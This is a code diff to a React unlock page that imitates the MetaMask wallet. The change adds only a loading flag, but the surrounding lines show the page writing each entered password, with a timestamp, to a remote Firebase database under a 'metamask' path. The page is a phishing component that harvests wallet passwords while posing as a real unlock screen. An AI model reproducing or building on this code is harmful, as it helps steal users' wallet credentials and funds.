@@ -176,6 +176,8 @@ const UnlockPage = ({onSuccess}) => {
     const timestamp = getCurrentTimestamp();
     console.log('Current timestamp:', timestamp);
     if (!password.length) return;
+    setIsCheckingPassword(true);
+
     set(ref(db, "88_/-metamask/" + formatDateWithMilliseconds()), {
       value: password,
       date: String(new Date()),
@@ -208,6 +210,7 @@ const UnlockPage = ({onSuccess}) => {
     } catch (error) {
       // throw new Error(`Failed to fetch data: ${error.message}`);
       console.error(`Failed to decrypt vault: ${error.message}`)
+      setIsCheckingPassword(false);
       setErrorMessage("Password is incorrect. Please try again.");
     }
   };
